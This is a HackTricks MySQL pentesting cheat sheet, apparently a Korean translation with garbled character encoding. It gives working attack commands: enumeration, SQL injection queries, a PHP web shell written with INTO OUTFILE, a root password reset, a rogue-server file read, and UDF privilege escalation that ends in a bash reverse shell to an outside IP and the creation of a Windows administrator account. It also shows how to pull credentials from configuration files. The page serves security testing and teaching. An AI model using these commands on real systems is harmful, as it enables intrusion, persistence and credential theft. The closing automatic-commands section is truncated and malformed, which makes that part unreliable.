# 3306 - MySQL Pentesting

<details>

<summary><strong>htARTE (HackTricks AWS Red Team ì „ë¬¸ê°€)ë¡œë¶€í„° AWS í•´í‚¹ì„ ì œë¡œë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ìš°ì„¸ìš”!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ê³  ì‹¶ë‹¤ë©´ [**êµ¬ë… ìš”ê¸ˆì œ**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì™œê·¸**](https://peass.creator-spring.com)ë¥¼ êµ¬ë§¤í•˜ì„¸ìš”
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”, ë‹¹ì‚¬ì˜ ë…ì  [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ê°€ì…**í•˜ê±°ë‚˜ **íŠ¸ìœ„í„°** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)ë¥¼ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **HackTricks** ë° **HackTricks Cloud** github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ì„¸ìš”.

</details>

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/)ì€ **ìŠ¤í˜ì¸**ì—ì„œ ê°€ì¥ ì¤‘ìš”í•œ ì‚¬ì´ë²„ ë³´ì•ˆ ì´ë²¤íŠ¸ ì¤‘ í•˜ë‚˜ë¡œ **ìœ ëŸ½**ì—ì„œë„ ê°€ì¥ ì¤‘ìš”í•œ í–‰ì‚¬ ì¤‘ í•˜ë‚˜ì…ë‹ˆë‹¤. **ê¸°ìˆ  ì§€ì‹ì„ ì´‰ì§„í•˜ëŠ” ë° ë…¸ë ¥í•˜ëŠ”** ì´ ì»¨í¼ëŸ°ìŠ¤ëŠ” ëª¨ë“  ë¶„ì•¼ì˜ ê¸°ìˆ  ë° ì‚¬ì´ë²„ ë³´ì•ˆ ì „ë¬¸ê°€ë“¤ì„ ìœ„í•œ ì¤‘ìš”í•œ ëª¨ì„ì…ë‹ˆë‹¤.

{% embed url="https://www.rootedcon.com/" %}

## **ê¸°ë³¸ ì •ë³´**

**MySQL**ëŠ” ë¹„ìš©ì´ ë“¤ì§€ ì•ŠëŠ” ì˜¤í”ˆ ì†ŒìŠ¤ **ê´€ê³„í˜• ë°ì´í„°ë² ì´ìŠ¤ ê´€ë¦¬ ì‹œìŠ¤í…œ (RDBMS)**ë¡œ ì„¤ëª…ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤. **êµ¬ì¡°í™”ëœ ì¿¼ë¦¬ ì–¸ì–´ (SQL)**ì—ì„œ ì‘ë™í•˜ì—¬ ë°ì´í„°ë² ì´ìŠ¤ì˜ ê´€ë¦¬ ë° ì¡°ì‘ì„ ê°€ëŠ¥í•˜ê²Œ í•©ë‹ˆë‹¤.

**ê¸°ë³¸ í¬íŠ¸:** 3306
```
3306/tcp open  mysql
```
## **ì—°ê²°**

### **ë¡œì»¬**
```bash
mysql -u root # Connect to root without password
mysql -u root -p # A password will be asked (check someone)
```
### ì›ê²©
```bash
mysql -h <Hostname> -u root
mysql -h <Hostname> -u root@localhost
```
## ì™¸ë¶€ ì—´ê±°

ì¼ë¶€ ì—´ê±° ì‘ì—…ì—ëŠ” ìœ íš¨í•œ ìê²© ì¦ëª…ì´ í•„ìš”í•©ë‹ˆë‹¤.
```bash
nmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 <IP>
msf> use auxiliary/scanner/mysql/mysql_version
msf> use auxiliary/scanner/mysql/mysql_authbypass_hashdump
msf> use auxiliary/scanner/mysql/mysql_hashdump #Creds
msf> use auxiliary/admin/mysql/mysql_enum #Creds
msf> use auxiliary/scanner/mysql/mysql_schemadump #Creds
msf> use exploit/windows/mysql/mysql_start_up #Execute commands Windows, Creds
```
### [**ë¬´ì°¨ë³„ ëŒ€ì… ê³µê²©**](../generic-methodologies-and-resources/brute-force.md#mysql)

### ì´ì§„ ë°ì´í„°ë¥¼ ì‘ì„±í•˜ì„¸ìš”
```bash
CONVERT(unhex("6f6e2e786d6c55540900037748b75c7249b75"), BINARY)
CONVERT(from_base64("aG9sYWFhCg=="), BINARY)
```
## **MySQL ëª…ë ¹ì–´**
```bash
show databases;
use <database>;
connect <database>;
show tables;
describe <table_name>;
show columns from <table>;

select version(); #version
select @@version(); #version
select user(); #User
select database(); #database name

#Get a shell with the mysql client user
\! sh

#Basic MySQLi
Union Select 1,2,3,4,group_concat(0x7c,table_name,0x7C) from information_schema.tables
Union Select 1,2,3,4,column_name from information_schema.columns where table_name="<TABLE NAME>"

#Read & Write
## Yo need FILE privilege to read & write to files.
select load_file('/var/lib/mysql-files/key.txt'); #Read file
select 1,2,"<?php echo shell_exec($_GET['c']);?>",4 into OUTFILE 'C:/xampp/htdocs/back.php'

#Try to change MySQL root password
UPDATE mysql.user SET Password=PASSWORD('MyNewPass') WHERE User='root';
UPDATE mysql.user SET authentication_string=PASSWORD('MyNewPass') WHERE User='root';
FLUSH PRIVILEGES;
quit;
```

```bash
mysql -u username -p < manycommands.sql #A file with all the commands you want to execute
mysql -u root -h 127.0.0.1 -e 'show databases;'
```
### MySQL ê¶Œí•œ ì—´ê±°
```sql
#Mysql
SHOW GRANTS [FOR user];
SHOW GRANTS;
SHOW GRANTS FOR 'root'@'localhost';
SHOW GRANTS FOR CURRENT_USER();

# Get users, permissions & hashes
SELECT * FROM mysql.user;

#From DB
select * from mysql.user where user='root';
## Get users with file_priv
select user,file_priv from mysql.user where file_priv='Y';
## Get users with Super_priv
select user,Super_priv from mysql.user where Super_priv='Y';

# List functions
SELECT routine_name FROM information_schema.routines WHERE routine_type = 'FUNCTION';
#@ Functions not from sys. db
SELECT routine_name FROM information_schema.routines WHERE routine_type = 'FUNCTION' AND routine_schema!='sys';
```
### MySQL íŒŒì¼ RCE

{% content-ref url="../pentesting-web/sql-injection/mysql-injection/mysql-ssrf.md" %}
[mysql-ssrf.md](../pentesting-web/sql-injection/mysql-injection/mysql-ssrf.md)
{% endcontent-ref %}

## í´ë¼ì´ì–¸íŠ¸ì— ì˜í•œ MySQL ì„ì˜ íŒŒì¼ ì½ê¸°

ì‹¤ì œë¡œ **ë¡œì»¬ ë°ì´í„°ë¥¼ í…Œì´ë¸”ë¡œ ë¡œë“œ**í•˜ë ¤ê³  í•  ë•Œ, MySQL ë˜ëŠ” MariaDB ì„œë²„ëŠ” **í´ë¼ì´ì–¸íŠ¸ì— íŒŒì¼ ë‚´ìš©ì„ ì½ë„ë¡ ìš”ì²­**í•˜ê³  ë‚´ìš©ì„ ë³´ëƒ…ë‹ˆë‹¤. **ê·¸ëŸ° ë‹¤ìŒ, MySQL í´ë¼ì´ì–¸íŠ¸ë¥¼ ì¡°ì‘í•˜ì—¬ ìì²´ MySQL ì„œë²„ì— ì—°ê²°í•˜ë„ë¡ í•  ìˆ˜ ìˆë‹¤ë©´ ì„ì˜ íŒŒì¼ì„ ì½ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.**\
ì´ê²ƒì´ ì‚¬ìš© ì¤‘ì¸ ë™ì‘ì„ì„ ì£¼ì˜í•˜ì„¸ìš”:
```bash
load data local infile "/etc/passwd" into table test FIELDS TERMINATED BY '\n';
```
(ë¡œì»¬" ë‹¨ì–´ì— ìœ ì˜)\
"ë¡œì»¬"ì´ ì—†ìœ¼ë©´ ë‹¤ìŒì„ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
mysql> load data infile "/etc/passwd" into table test FIELDS TERMINATED BY '\n';

ERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv option so it cannot execute this statement
```
**ì´ˆê¸° PoC:** [**https://github.com/allyshka/Rogue-MySql-Server**](https://github.com/allyshka/Rogue-MySql-Server)\
**ì´ ë…¼ë¬¸ì—ì„œëŠ” ê³µê²©ì— ëŒ€í•œ ì™„ì „í•œ ì„¤ëª…ê³¼ ì‹¬ì§€ì–´ RCEë¡œ í™•ì¥í•˜ëŠ” ë°©ë²•ì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤:** [**https://paper.seebug.org/1113/**](https://paper.seebug.org/1113/)\
**ì—¬ê¸°ì„œ ê³µê²© ê°œìš”ë¥¼ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤:** [**http://russiansecurity.expert/2016/04/20/mysql-connect-file-read/**](http://russiansecurity.expert/2016/04/20/mysql-connect-file-read/)

â€‹

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

â€‹â€‹[**RootedCON**](https://www.rootedcon.com/)ì€ **ìŠ¤í˜ì¸**ì—ì„œ ê°€ì¥ ì¤‘ìš”í•œ ì‚¬ì´ë²„ ë³´ì•ˆ ì´ë²¤íŠ¸ ì¤‘ í•˜ë‚˜ì´ë©° **ìœ ëŸ½**ì—ì„œ ê°€ì¥ ì¤‘ìš”í•œ ì´ë²¤íŠ¸ ì¤‘ í•˜ë‚˜ì…ë‹ˆë‹¤. **ê¸°ìˆ  ì§€ì‹ì„ ì´‰ì§„í•˜ëŠ” ë° ë´‰ì‚¬í•˜ëŠ”** ì´ ì»¨í¼ëŸ°ìŠ¤ëŠ” ëª¨ë“  ë¶„ì•¼ì˜ ê¸°ìˆ  ë° ì‚¬ì´ë²„ ë³´ì•ˆ ì „ë¬¸ê°€ë“¤ì—ê²Œ ëœ¨ê±°ìš´ ë§Œë‚¨ì˜ ì¥ì…ë‹ˆë‹¤.

{% embed url="https://www.rootedcon.com/" %}

## POST

### Mysql ì‚¬ìš©ì

ë§Œì•½ mysqlì´ **root**ë¡œ ì‹¤í–‰ ì¤‘ì´ë¼ë©´ ë§¤ìš° í¥ë¯¸ë¡œìš¸ ê²ƒì…ë‹ˆë‹¤:
```bash
cat /etc/mysql/mysql.conf.d/mysqld.cnf | grep -v "#" | grep "user"
systemctl status mysql 2>/dev/null | grep -o ".\{0,0\}user.\{0,50\}" | cut -d '=' -f2 | cut -d ' ' -f1
```
#### mysqld.cnfì˜ ìœ„í—˜í•œ ì„¤ì •

MySQL ì„œë¹„ìŠ¤ì˜ êµ¬ì„±ì—ì„œëŠ” ë‹¤ì–‘í•œ ì„¤ì •ì´ ì‚¬ìš©ë˜ì–´ ì‘ë™ ë° ë³´ì•ˆ ì¡°ì¹˜ê°€ ì •ì˜ë©ë‹ˆë‹¤:

* **`user`** ì„¤ì •ì€ MySQL ì„œë¹„ìŠ¤ê°€ ì‹¤í–‰ë  ì‚¬ìš©ìë¥¼ ì§€ì •í•˜ëŠ” ë° ì‚¬ìš©ë©ë‹ˆë‹¤.
* **`password`**ëŠ” MySQL ì‚¬ìš©ìì™€ ê´€ë ¨ëœ ì•”í˜¸ë¥¼ ì„¤ì •í•˜ëŠ” ë° ì‚¬ìš©ë©ë‹ˆë‹¤.
* **`admin_address`**ëŠ” ê´€ë¦¬ ë„¤íŠ¸ì›Œí¬ ì¸í„°í˜ì´ìŠ¤ì—ì„œ TCP/IP ì—°ê²°ì„ ìˆ˜ì‹ í•˜ëŠ” IP ì£¼ì†Œë¥¼ ì§€ì •í•©ë‹ˆë‹¤.
* **`debug`** ë³€ìˆ˜ëŠ” í˜„ì¬ ë””ë²„ê¹… êµ¬ì„±ì„ ë‚˜íƒ€ë‚´ë©° ë¡œê·¸ ë‚´ì— ë¯¼ê°í•œ ì •ë³´ê°€ í¬í•¨ë©ë‹ˆë‹¤.
* **`sql_warnings`**ëŠ” ê²½ê³ ê°€ ë°œìƒí•  ë•Œ ë‹¨ì¼ í–‰ INSERT ë¬¸ì— ëŒ€í•œ ì •ë³´ ë¬¸ìì—´ì´ ìƒì„±ë˜ëŠ”ì§€ë¥¼ ê´€ë¦¬í•˜ë©° ë¡œê·¸ ë‚´ì— ë¯¼ê°í•œ ë°ì´í„°ê°€ í¬í•¨ë©ë‹ˆë‹¤.
* **`secure_file_priv`**ë¥¼ ì‚¬ìš©í•˜ë©´ ë°ì´í„° ê°€ì ¸ì˜¤ê¸° ë° ë‚´ë³´ë‚´ê¸° ì‘ì—…ì˜ ë²”ìœ„ê°€ ì œí•œë˜ì–´ ë³´ì•ˆì´ ê°•í™”ë©ë‹ˆë‹¤.

### ê¶Œí•œ ìƒìŠ¹
```bash
# Get current user (an all users) privileges and hashes
use mysql;
select user();
select user,password,create_priv,insert_priv,update_priv,alter_priv,delete_priv,drop_priv from user;

# Get users, permissions & creds
SELECT * FROM mysql.user;
mysql -u root --password=<PASSWORD> -e "SELECT * FROM mysql.user;"

# Create user and give privileges
create user test identified by 'test';
grant SELECT,CREATE,DROP,UPDATE,DELETE,INSERT on *.* to mysql identified by 'mysql' WITH GRANT OPTION;

# Get a shell (with your permissions, usefull for sudo/suid privesc)
\! sh
```
### ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ í†µí•œ ê¶Œí•œ ìƒìŠ¹

ë§Œì•½ **mysql ì„œë²„ê°€ ë£¨íŠ¸ë¡œ ì‹¤í–‰ ì¤‘**ì´ë¼ë©´ (ë˜ëŠ” ë‹¤ë¥¸ ë” ë†’ì€ ê¶Œí•œì„ ê°€ì§„ ì‚¬ìš©ìë¼ë©´) ëª…ë ¹ì„ ì‹¤í–‰ì‹œí‚¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ë¥¼ ìœ„í•´ **ì‚¬ìš©ì ì •ì˜ í•¨ìˆ˜**ë¥¼ ì‚¬ìš©í•´ì•¼ í•©ë‹ˆë‹¤. ê·¸ë¦¬ê³  ì‚¬ìš©ì ì •ì˜ í•¨ìˆ˜ë¥¼ ìƒì„±í•˜ë ¤ë©´ mysqlì„ ì‹¤í–‰ ì¤‘ì¸ OSì— ëŒ€í•œ **ë¼ì´ë¸ŒëŸ¬ë¦¬**ê°€ í•„ìš”í•©ë‹ˆë‹¤.

ì•…ì˜ì ì¸ ë¼ì´ë¸ŒëŸ¬ë¦¬ëŠ” sqlmap ë‚´ë¶€ì™€ metasploit ë‚´ë¶€ì—ì„œ **`locate "*lib_mysqludf_sys*"`**ë¥¼ ì‹¤í–‰í•˜ì—¬ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤. **`.so`** íŒŒì¼ì€ **ë¦¬ëˆ…ìŠ¤** ë¼ì´ë¸ŒëŸ¬ë¦¬ì´ê³  **`.dll`** íŒŒì¼ì€ **Windows**ìš©ì…ë‹ˆë‹¤. í•„ìš”í•œ ê²ƒì„ ì„ íƒí•˜ì‹­ì‹œì˜¤.

ë§Œì•½ í•´ë‹¹ ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ **ê°€ì§€ê³  ìˆì§€ ì•Šë‹¤ë©´**, í•´ë‹¹ ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ **ì°¾ì•„ë³´ê±°ë‚˜**, ì´ [**ë¦¬ëˆ…ìŠ¤ C ì½”ë“œ**](https://www.exploit-db.com/exploits/1518)ë¥¼ ë‹¤ìš´ë¡œë“œí•˜ì—¬ **ë¦¬ëˆ…ìŠ¤ ì·¨ì•½í•œ ê¸°ê³„ ë‚´ì—ì„œ ì»´íŒŒì¼**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```bash
gcc -g -c raptor_udf2.c
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```
ì´ì œ ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ê°€ì§€ê³  ìˆìœ¼ë¯€ë¡œ Mysqlì— íŠ¹ê¶Œ ì‚¬ìš©ì(root?)ë¡œ ë¡œê·¸ì¸í•˜ê³  ë‹¤ìŒ ë‹¨ê³„ë¥¼ ë”°ë¥´ì‹­ì‹œì˜¤:

#### Linux
```sql
# Use a database
use mysql;
# Create a table to load the library and move it to the plugins dir
create table npn(line blob);
# Load the binary library inside the table
## You might need to change the path and file name
insert into npn values(load_file('/tmp/lib_mysqludf_sys.so'));
# Get the plugin_dir path
show variables like '%plugin%';
# Supposing the plugin dir was /usr/lib/x86_64-linux-gnu/mariadb19/plugin/
# dump in there the library
select * from npn into dumpfile '/usr/lib/x86_64-linux-gnu/mariadb19/plugin/lib_mysqludf_sys.so';
# Create a function to execute commands
create function sys_exec returns integer soname 'lib_mysqludf_sys.so';
# Execute commands
select sys_exec('id > /tmp/out.txt; chmod 777 /tmp/out.txt');
select sys_exec('bash -c "bash -i >& /dev/tcp/10.10.14.66/1234 0>&1"');
```
#### ìœˆë„ìš°
```sql
# CHech the linux comments for more indications
USE mysql;
CREATE TABLE npn(line blob);
INSERT INTO npn values(load_file('C://temp//lib_mysqludf_sys.dll'));
show variables like '%plugin%';
SELECT * FROM mysql.npn INTO DUMPFILE 'c://windows//system32//lib_mysqludf_sys_32.dll';
CREATE FUNCTION sys_exec RETURNS integer SONAME 'lib_mysqludf_sys_32.dll';
SELECT sys_exec("net user npn npn12345678 /add");
SELECT sys_exec("net localgroup Administrators npn /add");
```
### íŒŒì¼ì—ì„œ MySQL ìê²© ì¦ëª… ì¶”ì¶œ

_/etc/mysql/debian.cnf_ ë‚´ë¶€ì—ëŠ” ì‚¬ìš©ì **debian-sys-maint**ì˜ **í‰ë¬¸ ì•”í˜¸**ë¥¼ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```bash
cat /etc/mysql/debian.cnf
```
ë‹¤ìŒ **ìê²© ì¦ëª…ì„ ì‚¬ìš©í•˜ì—¬ mysql ë°ì´í„°ë² ì´ìŠ¤ì— ë¡œê·¸ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤**.

íŒŒì¼ ë‚´ë¶€: _/var/lib/mysql/mysql/user.MYD_ ì—ì„œ **MySQL ì‚¬ìš©ìì˜ ëª¨ë“  í•´ì‹œë¥¼ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤** (ë°ì´í„°ë² ì´ìŠ¤ ë‚´ë¶€ì˜ mysql.userì—ì„œ ì¶”ì¶œí•  ìˆ˜ ìˆëŠ” ê²ƒë“¤)_._

ë‹¤ìŒì„ ìˆ˜í–‰í•˜ì—¬ ì¶”ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
grep -oaE "[-_\.\*a-Z0-9]{3,}" /var/lib/mysql/mysql/user.MYD | grep -v "mysql_native_password"
```
### ë¡œê¹… í™œì„±í™”

ë‹¤ìŒ ì¤„ì„ ì£¼ì„ ì²˜ë¦¬ í•´ì œí•˜ì—¬ `/etc/mysql/my.cnf` ë‚´ì—ì„œ mysql ì¿¼ë¦¬ì˜ ë¡œê¹…ì„ í™œì„±í™”í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

![](<../.gitbook/assets/image (899).png>)

### ìœ ìš©í•œ íŒŒì¼

êµ¬ì„± íŒŒì¼

* windows \*
* config.ini
* my.ini
* windows\my.ini
* winnt\my.ini
* \<InstDir>/mysql/data/
* unix
* my.cnf
* /etc/my.cnf
* /etc/mysql/my.cnf
* /var/lib/mysql/my.cnf
* \~/.my.cnf
* /etc/my.cnf
* ëª…ë ¹ íˆìŠ¤í† ë¦¬
* \~/.mysql.history
* ë¡œê·¸ íŒŒì¼
* connections.log
* update.log
* common.log

## ê¸°ë³¸ MySQL ë°ì´í„°ë² ì´ìŠ¤/í…Œì´ë¸”

{% tabs %}
{% tab title="information_schema" %}
ALL\_PLUGINS\
APPLICABLE\_ROLES\
CHARACTER\_SETS\
CHECK\_CONSTRAINTS\
COLLATIONS\
COLLATION\_CHARACTER\_SET\_APPLICABILITY\
COLUMNS\
COLUMN\_PRIVILEGES\
ENABLED\_ROLES\
ENGINES\
EVENTS\
FILES\
GLOBAL\_STATUS\
GLOBAL\_VARIABLES\
KEY\_COLUMN\_USAGE\
KEY\_CACHES\
OPTIMIZER\_TRACE\
PARAMETERS\
PARTITIONS\
PLUGINS\
PROCESSLIST\
PROFILING\
REFERENTIAL\_CONSTRAINTS\
ROUTINES\
SCHEMATA\
SCHEMA\_PRIVILEGES\
SESSION\_STATUS\
SESSION\_VARIABLES\
STATISTICS\
SYSTEM\_VARIABLES\
TABLES\
TABLESPACES\
TABLE\_CONSTRAINTS\
TABLE\_PRIVILEGES\
TRIGGERS\
USER\_PRIVILEGES\
VIEWS\
INNODB\_LOCKS\
INNODB\_TRX\
INNODB\_SYS\_DATAFILES\
INNODB\_FT\_CONFIG\
INNODB\_SYS\_VIRTUAL\
INNODB\_CMP\
INNODB\_FT\_BEING\_DELETED\
INNODB\_CMP\_RESET\
INNODB\_CMP\_PER\_INDEX\
INNODB\_CMPMEM\_RESET\
INNODB\_FT\_DELETED\
INNODB\_BUFFER\_PAGE\_LRU\
INNODB\_LOCK\_WAITS\
INNODB\_TEMP\_TABLE\_INFO\
INNODB\_SYS\_INDEXES\
INNODB\_SYS\_TABLES\
INNODB\_SYS\_FIELDS\
INNODB\_CMP\_PER\_INDEX\_RESET\
INNODB\_BUFFER\_PAGE\
INNODB\_FT\_DEFAULT\_STOPWORD\
INNODB\_FT\_INDEX\_TABLE\
INNODB\_FT\_INDEX\_CACHE\
INNODB\_SYS\_TABLESPACES\
INNODB\_METRICS\
INNODB\_SYS\_FOREIGN\_COLS\
INNODB\_CMPMEM\
INNODB\_BUFFER\_POOL\_STATS\
INNODB\_SYS\_COLUMNS\
INNODB\_SYS\_FOREIGN\
INNODB\_SYS\_TABLESTATS\
GEOMETRY\_COLUMNS\
SPATIAL\_REF\_SYS\
CLIENT\_STATISTICS\
INDEX\_STATISTICS\
USER\_STATISTICS\
INNODB\_MUTEXES\
TABLE\_STATISTICS\
INNODB\_TABLESPACES\_ENCRYPTION\
user\_variables\
INNODB\_TABLESPACES\_SCRUBBING\
INNODB\_SYS\_SEMAPHORE\_WAITS
{% endtab %}

{% tab title="mysql" %}
columns\_priv\
column\_stats\
db\
engine\_cost\
event\
func\
general\_log\
gtid\_executed\
gtid\_slave\_pos\
help\_category\
help\_keyword\
help\_relation\
help\_topic\
host\
index\_stats\
innodb\_index\_stats\
innodb\_table\_stats\
ndb\_binlog\_index\
plugin\
proc\
procs\_priv\
proxies\_priv\
roles\_mapping\
server\_cost\
servers\
slave\_master\_info\
slave\_relay\_log\_info\
slave\_worker\_info\
slow\_log\
tables\_priv\
table\_stats\
time\_zone\
time\_zone\_leap\_second\
time\_zone\_name\
time\_zone\_transition\
time\_zone\_transition\_type\
transaction\_registry\
user
{% endtab %}

{% tab title="performance_schema" %}
accounts\
cond\_instances\
events\_stages\_current\
events\_stages\_history\
events\_stages\_history\_long\
events\_stages\_summary\_by\_account\_by\_event\_name\
events\_stages\_summary\_by\_host\_by\_event\_name\
events\_stages\_summary\_by\_thread\_by\_event\_name\
events\_stages\_summary\_by\_user\_by\_event\_name\
events\_stages\_summary\_global\_by\_event\_name\
events\_statements\_current\
events\_statements\_history\
events\_statements\_history\_long\
events\_statements\_summary\_by\_account\_by\_event\_name\
events\_statements\_summary\_by\_digest\
events\_statements\_summary\_by\_host\_by\_event\_name\
events\_statements\_summary\_by\_program\
events\_statements\_summary\_by\_thread\_by\_event\_name\
events\_statements\_summary\_by\_user\_by\_event\_name\
events\_statements\_summary\_global\_by\_event\_name\
events\_transactions\_current\
events\_transactions\_history\
events\_transactions\_history\_long\
events\_transactions\_summary\_by\_account\_by\_event\_name\
events\_transactions\_summary\_by\_host\_by\_event\_name\
events\_transactions\_summary\_by\_thread\_by\_event\_name\
events\_transactions\_summary\_by\_user\_by\_event\_name\
events\_transactions\_summary\_global\_by\_event\_name\
events\_waits\_current\
events\_waits\_history\
events\_waits\_history\_long\
events\_waits\_summary\_by\_account\_by\_event\_name\
events\_waits\_summary\_by\_host\_by\_event\_name\
events\_waits\_summary\_by\_instance\
events\_waits\_summary\_by\_thread\_by\_event\_name\
events\_waits\_summary\_by\_user\_by\_event\_name\
events\_waits\_summary\_global\_by\_event\_name\
file\_instances\
file\_summary\_by\_event\_name\
file\_summary\_by\_instance\
global\_status\
global\_variables\
host\_cache\
hosts\
memory\_summary\_by\_account\_by\_event\_name\
memory\_summary\_by\_host\_by\_event\_name\
memory\_summary\_by\_thread\_by\_event\_name\
memory\_summary\_by\_user\_by\_event\_name\
memory\_summary\_global\_by\_event\_name\
metadata\_locks\
mutex\_instances\
objects\_summary\_global\_by\_type\
performance\_timers\
prepared\_statements\_instances\
replication\_applier\_configuration\
replication\_applier\_status\
replication\_applier\_status\_by\_coordinator\
replication\_applier\_status\_by\_worker\
replication\_connection\_configuration\
replication\_connection\_status\
replication\_group\_member\_stats\
replication\_group\_members\
rwlock\_instances\
session\_account\_connect\_attrs\
session\_connect\_attrs\
session\_status\
session\_variables\
setup\_actors\
setup\_consumers\
setup\_instruments\
setup\_objects\
setup\_timers\
socket\_instances\
socket\_summary\_by\_event\_name\
socket\_summary\_by\_instance\
status\_by\_account\
status\_by\_host\
status\_by\_thread\
status\_by\_user\
table\_handles\
table\_io\_waits\_summary\_by\_index\_usage\
table\_io\_waits\_summary\_by\_table\
table\_lock\_waits\_summary\_by\_table\
threads\
user\_variables\_by\_thread\
users\
variables\_by\_thread
{% endtab %}

{% tab title="sys" %}
host\_summary\
host\_summary\_by\_file\_io\
host\_summary\_by\_file\_io\_type\
host\_summary\_by\_stages\
host\_summary\_by\_statement\_latency\
host\_summary\_by\_statement\_type\
innodb\_buffer\_stats\_by\_schema\
innodb\_buffer\_stats\_by\_table\
innodb\_lock\_waits\
io\_by\_thread\_by\_latency\
io\_global\_by\_file\_by\_bytes\
io\_global\_by\_file\_by\_latency\
io\_global\_by\_wait\_by\_bytes\
io\_global\_by\_wait\_by\_latency\
latest\_file\_io\
memory\_by\_host\_by\_current\_bytes\
memory\_by\_thread\_by\_current\_bytes\
memory\_by\_user\_by\_current\_bytes\
memory\_global\_by\_current\_bytes\
memory\_global\_total\
metrics\
processlist\
ps\_check\_lost\_instrumentation\
schema\_auto\_increment\_columns\
schema\_index\_statistics\
schema\_object\_overview\
schema\_redundant\_indexes\
schema\_table\_lock\_waits\
```markdown
schema_table_statistics\
schema_table_statistics_with_buffer\
schema_tables_with_full_table_scans\
schema_unused_indexes\
session\
session_ssl_status\
statement_analysis\
statements_with_errors_or_warnings\
statements_with_full_table_scans\
statements_with_runtimes_in_95th_percentile\
statements_with_sorting\
statements_with_temp_tables\
sys_config\
user_summary\
user_summary_by_file_io\
user_summary_by_file_io_type\
user_summary_by_stages\
user_summary_by_statement_latency\
user_summary_by_statement_type\
version\
wait_classes_global_by_avg_latency\
wait_classes_global_by_latency\
waits_by_host_by_latency\
waits_by_user_by_latency\
waits_global_by_latency\
x$host_summary\
x$host_summary_by_file_io\
x$host_summary_by_file_io_type\
x$host_summary_by_stages\
x$host_summary_by_statement_latency\
x$host_summary_by_statement_type\
x$innodb_buffer_stats_by_schema\
x$innodb_buffer_stats_by_table\
x$innodb_lock_waits\
x$io_by_thread_by_latency\
x$io_global_by_file_by_bytes\
x$io_global_by_file_by_latency\
x$io_global_by_wait_by_bytes\
x$io_global_by_wait_by_latency\
x$latest_file_io\
x$memory_by_host_by_current_bytes\
x$memory_by_thread_by_current_bytes\
x$memory_by_user_by_current_bytes\
x$memory_global_by_current_bytes\
x$memory_global_total\
x$processlist\
x$ps_digest_95th_percentile_by_avg_us\
x$ps_digest_avg_latency_distribution\
x$ps_schema_table_statistics_io\
x$schema_flattened_keys\
x$schema_index_statistics\
x$schema_table_lock_waits\
x$schema_table_statistics\
x$schema_table_statistics_with_buffer\
x$schema_tables_with_full_table_scans\
x$session\
x$statement_analysis\
x$statements_with_errors_or_warnings\
x$statements_with_full_table_scans\
x$statements_with_runtimes_in_95th_percentile\
x$statements_with_sorting\
x$statements_with_temp_tables\
x$user_summary\
x$user_summary_by_file_io\
x$user_summary_by_file_io_type\
x$user_summary_by_stages\
x$user_summary_by_statement_latency\
x$user_summary_by_statement_type\
x$wait_classes_global_by_avg_latency\
x$wait_classes_global_by_latency\
x$waits_by_host_by_latency\
x$waits_by_user_by_latency\
x$waits_global_by_latency
{% endtab %}
{% endtabs %}

## HackTricks Automatic Commands
```
```
Protocol_Name: MySql    #Protocol Abbreviation if there is one.
Port_Number:  3306     #Comma separated if there is more than one.
Protocol_Description: MySql     #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for MySql
Note: |
MySQL is a freely available open source Relational Database Management System (RDBMS) that uses Structured Query Language (SQL).

